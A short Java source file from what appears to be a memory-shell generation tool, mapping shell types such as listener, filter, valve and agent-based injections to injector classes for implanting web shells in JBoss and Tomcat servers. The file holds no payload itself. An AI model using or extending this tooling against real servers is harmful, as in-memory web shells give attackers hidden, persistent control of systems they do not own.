package com.reajason.javaweb.memshell.server;

import com.reajason.javaweb.memshell.injector.jboss.JbossProxyValveInjector;
import com.reajason.javaweb.memshell.injector.jboss.JbossValveInjector;
import com.reajason.javaweb.memshell.injector.tomcat.TomcatContextValveAgentInjector;
import com.reajason.javaweb.memshell.injector.tomcat.TomcatFilterChainAgentInjector;
import com.reajason.javaweb.memshell.injector.tomcat.TomcatFilterInjector;
import com.reajason.javaweb.memshell.injector.tomcat.TomcatListenerInjector;

import static com.reajason.javaweb.memshell.ShellType.*;

/**
 * @author ReaJason
 * @since 2024/12/10
 */
public class JbossShell extends AbstractShell {

    @Override
    public Class<?> getListenerInterceptor() {
        return TomcatShell.ListenerInterceptor.class;
    }

    @Override
    public InjectorMapping getShellInjectorMapping() {
        return InjectorMapping.builder()
                .addInjector(LISTENER, TomcatListenerInjector.class)
                .addInjector(FILTER, TomcatFilterInjector.class)
                .addInjector(VALVE, JbossValveInjector.class)
                .addInjector(PROXY_VALVE, JbossProxyValveInjector.class)
                .addInjector(AGENT_FILTER_CHAIN, TomcatFilterChainAgentInjector.class)
                .addInjector(CATALINA_AGENT_CONTEXT_VALVE, TomcatContextValveAgentInjector.class)
                .build();
    }
}